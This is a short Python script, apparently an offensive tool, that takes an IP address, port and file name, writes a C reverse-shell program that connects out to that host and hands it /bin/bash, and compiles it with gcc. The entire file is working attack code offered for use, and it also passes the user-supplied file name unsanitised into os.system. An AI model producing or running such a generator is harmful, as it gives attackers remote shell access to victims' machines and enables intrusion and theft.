import os
def RSMaker():
    ip = input (str("Enter IP : "))
    ip = "\"%s\""%(ip)
    port = input ("Enter Port : ")
    name = input ("Enter File Name :")
    shell = '''
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>


int main(void){
    int port = PORT,
        sockt = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in revsockaddr;
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr(IP);

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char *const argv[] = {"/bin/bash",NULL};

    execve("/bin/bash",argv,NULL);

    return 0;
}

    '''
    write = open("reverse.c",'w')
    write.write("#define IP %s"%(ip))
    write.write("\n#define PORT %s"%(port))
    write.write(shell)
    write.close()
    cmd = ("gcc reverse.c -o %s"%(name))
    os.system(cmd)
